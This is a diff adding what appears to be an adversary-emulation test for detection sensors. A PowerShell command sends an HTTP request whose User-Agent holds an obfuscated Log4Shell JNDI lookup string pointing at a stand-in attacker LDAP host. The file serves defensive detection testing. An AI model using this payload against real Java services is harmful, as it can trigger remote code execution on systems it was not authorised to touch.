@@ -1,0 +1,48 @@
+---
+- id: scn013-a1-bad-user-agent
+  name: "SCN-013 | NDR: Bad User-Agent (Log4Shell)"
+  description: |
+    Sends an HTTP request with a Log4Shell-like JNDI User-Agent string
+    to simulate a suspicious User-Agent pattern that NDR sensors should flag.
+
+    MITRE ATT&CK: T1071.001 - Application Layer Protocol: Web Protocols
+    NDR Detection: Flow Risk 11 - Bad User-Agent
+
+    The JNDI lookup pattern (${jndi:ldap://...}) in the User-Agent header
+    is a strong indicator of Log4Shell (CVE-2021-44228) exploitation attempts.
+    NDR sensors inspect HTTP headers for this pattern regardless of the destination.
+
+    What to watch for:
+    - NDR alert for suspicious/malicious User-Agent header
+    - Flow Risk 11 classification
+    - The JNDI lookup string in the alert details
+  tactic: command-and-control
+  technique:
+    attack_id: T1071.001
+    name: "Application Layer Protocol: Web Protocols"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "=== BAD USER-AGENT SIMULATION (T1071.001) ===";
+          Write-Output "[*] Simulating Log4Shell-like JNDI User-Agent string";
+          $targetUrl = "http://webhook.site/NDR_TEST/user_agent_test";
+          $badUA = '${jndi:l${lower:d}ap://badguy.example.com:1389/h}';
+          Write-Output "[*] Target URL: $targetUrl";
+          Write-Output "[*] User-Agent: $badUA";
+          Write-Output "";
+          try {
+            curl.exe -s -A "$badUA" "$targetUrl" -o NUL;
+            Write-Output "[+] HTTP request sent with malicious User-Agent"
+          } catch {
+            Write-Output "[-] Request failed: $($_.Exception.Message)"
+          };
+          Write-Output "";
+          Write-Output "[*] Log4Shell (CVE-2021-44228) exploits embed JNDI lookup strings";
+          Write-Output "    in HTTP headers. When a vulnerable Java application logs the";
+          Write-Output "    User-Agent, it triggers a remote JNDI/LDAP lookup to the";
+          Write-Output "    attacker-controlled server, enabling remote code execution.";
+          Write-Output "";
+          Write-Output "[*] NDR should flag: Flow Risk 11 (Bad User-Agent)";
+          Write-Output "=== END BAD USER-AGENT ==="
+        cleanup: ""
